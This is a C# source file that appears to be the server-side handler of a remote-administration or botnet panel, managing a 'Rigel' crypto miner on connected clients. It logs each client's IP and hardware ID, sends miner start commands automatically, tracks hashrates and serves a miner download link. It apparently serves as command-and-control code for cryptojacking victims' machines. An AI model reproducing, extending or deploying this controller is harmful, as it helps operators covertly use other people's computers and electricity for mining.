using System.Drawing;
using System.Globalization;
using System.Windows.Forms;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages;

internal class HandlerMinerRigel
{
	public static void Read(Clients clients, object[] array)
	{
		try
		{
			Methods.AppendLogs(clients.IP, "HandlerMinerRigel: array[0] = " + ((array != null && array.Length != 0) ? array[0] : "null")?.ToString() + ", array[1] = " + ((array != null && array.Length > 1) ? array[1] : "null"), Color.Orange);
		}
		catch
		{
		}
		if (clients == null || array == null || array.Length < 2)
		{
			if (clients != null)
			{
				clients.Disconnect();
			}
			return;
		}
		switch ((string)array[1])
		{
		case "Connect":
		{
			string iP = clients.IP;
			bool work = Program.form.MinerRigel.work;
			Methods.AppendLogs(iP, "HandlerMinerRigel: Connect, work = " + work, Color.Orange);
			if (Program.form.MinerRigel.work)
			{
				clients.Hwid = (string)array[2];
				DataGridViewRow Item = new DataGridViewRow();
				Item.Tag = clients;
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = clients.IP
				});
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = clients.Hwid
				});
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = "dont mining"
				});
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = "0 MH/s"
				});
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = (string)array[3]
				});
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = (string)array[4]
				});
				clients.Tag = Item;
				Program.form.MinerRigel.Invoke((MethodInvoker)delegate
				{
					Program.form.MinerRigel.GridClients.Rows.Add(Item);
					Methods.AppendLogs(clients.IP, "HandlerMinerRigel: Added to grid!", Color.Green);
					if (Program.form.MinerRigel.materialSwitch7.Checked)
					{
						clients.Send(new object[4]
						{
							"MinerRigel",
							"Start",
							Program.form.MinerRigel.materialSwitch1.Checked,
							Program.form.MinerRigel.rjTextBox2.Texts
						});
					}
				});
			}
			else
			{
				Methods.AppendLogs(clients.IP, "HandlerMinerRigel: work = false, disconnecting", Color.Red);
				clients.Disconnect();
			}
			break;
		}
		case "Status":
			if (clients.Tag == null)
			{
				clients.Disconnect();
				break;
			}
			Program.form.MinerRigel.GridClients.Invoke((MethodInvoker)delegate
			{
				((DataGridViewRow)clients.Tag).Cells[2].Value = (string)array[2];
			});
			break;
		case "Hashrate":
			if (clients.Tag == null)
			{
				clients.Disconnect();
				break;
			}
			Program.form.MinerRigel.GridClients.Invoke((MethodInvoker)delegate
			{
				((DataGridViewRow)clients.Tag).Cells[3].Value = (string)array[2] + " MH/s";
			});
			break;
		case "HashrateStats":
		{
			if (clients.Tag == null || array.Length < 8)
			{
				clients.Disconnect();
				break;
			}
			Program.form.MinerRigel.GridClients.Invoke((MethodInvoker)delegate
			{
				((DataGridViewRow)clients.Tag).Cells[3].Value = (string)array[2] + " MH/s";
			});
			if (double.TryParse((string)array[2], NumberStyles.Float, CultureInfo.InvariantCulture, out var currentMH))
			{
				float currentH = (float)(currentMH * 1000000.0);
				Program.form.MinerRigel.hashrateHistory.Add(currentH);
				if (Program.form.MinerRigel.hashrateHistory.Count > 100)
				{
					Program.form.MinerRigel.hashrateHistory.RemoveAt(0);
				}
			}
			break;
		}
		case "GetLink":
			clients.Send(new object[2]
			{
				"Link",
				Program.form.settings.linkMiner
			});
			break;
		}
	}
}
